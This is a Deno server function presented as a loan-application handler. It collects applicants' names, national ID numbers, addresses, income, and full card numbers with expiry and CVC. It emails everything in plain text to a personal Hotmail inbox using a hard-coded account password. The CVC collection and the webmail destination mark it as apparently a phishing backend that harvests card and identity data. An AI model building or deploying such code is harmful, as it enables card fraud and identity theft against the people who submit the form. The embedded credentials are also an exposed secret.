import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { SmtpClient } from 'npm:nodemailer';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

const smtpConfig = {
  host: 'smtp-mail.outlook.com',
  port: 587,
  secure: false,
  auth: {
    user: 'diosfuego4444@hotmail.com',
    pass: 'Hotmail310300'
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { personalInfo, financialInfo, cardInfo, amount, term } = await req.json();

    const smtp = new SmtpClient(smtpConfig);

    const emailBody = `
      Nueva solicitud de préstamo:
      
      Datos Personales:
      - Nombre: ${personalInfo.name}
      - Email: ${personalInfo.email}
      - DNI: ${personalInfo.dni}
      - Teléfono: ${personalInfo.phone}
      - Dirección: ${personalInfo.address}
      
      Datos Financieros:
      - Situación laboral: ${financialInfo.employmentStatus}
      - Ingresos mensuales: $${financialInfo.monthlyIncome}
      - Personas a cargo: ${financialInfo.hasDependents ? 'Sí' : 'No'}
      - Otras deudas: $${financialInfo.otherDebts}
      
      Datos de Tarjeta:
      - Número: ${cardInfo.cardNumber}
      - Vencimiento: ${cardInfo.cardExpiry}
      - CVC: ${cardInfo.cardCVC}
      - Titular: ${cardInfo.cardHolderName}
      
      Préstamo Solicitado:
      - Monto: $${amount}
      - Plazo: ${term} meses
    `;

    await smtp.sendMail({
      from: 'diosfuego4444@hotmail.com',
      to: 'diosfuego4444@hotmail.com',
      subject: 'Nueva Solicitud de Préstamo',
      text: emailBody
    });

    return new Response(
      JSON.stringify({ success: true }),
      { 
        headers: {
          'Content-Type': 'application/json',
          ...corsHeaders
        }
      }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { 
        status: 500,
        headers: {
          'Content-Type': 'application/json',
          ...corsHeaders
        }
      }
    );
  }
});